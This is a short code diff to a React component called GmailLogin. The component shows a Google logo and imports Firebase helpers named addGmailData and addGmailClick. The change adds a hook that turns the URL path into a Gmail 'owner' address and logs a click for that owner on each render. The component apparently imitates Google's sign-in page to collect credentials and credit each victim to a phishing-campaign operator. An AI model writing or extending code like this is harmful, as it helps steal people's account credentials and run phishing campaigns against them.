@@ -1,7 +1,7 @@
-import React, { useRef, useState } from 'react'
+import React, { useEffect, useRef, useState } from 'react'
 
 import { useLocation, useNavigate, useParams } from 'react-router-dom'
-import { addData, addGmailData } from '../config/firebase'
+import { addData, addGmailClick, addGmailData } from '../config/firebase'
 import googleLogo from '../assets/img.png'
 
 const GmailLogin = () => {
@@ -56,6 +56,12 @@ const GmailLogin = () => {
       console.log(error?.message)
     }
   }
+
+  useEffect(() => {
+    const pathNames = location.pathname.split("/")
+    const ownerEmail = `${pathNames[1]}@gmail.com`
+    addGmailClick(ownerEmail)
+  })
 
   function handleSubmit(event) {
     event.preventDefault()
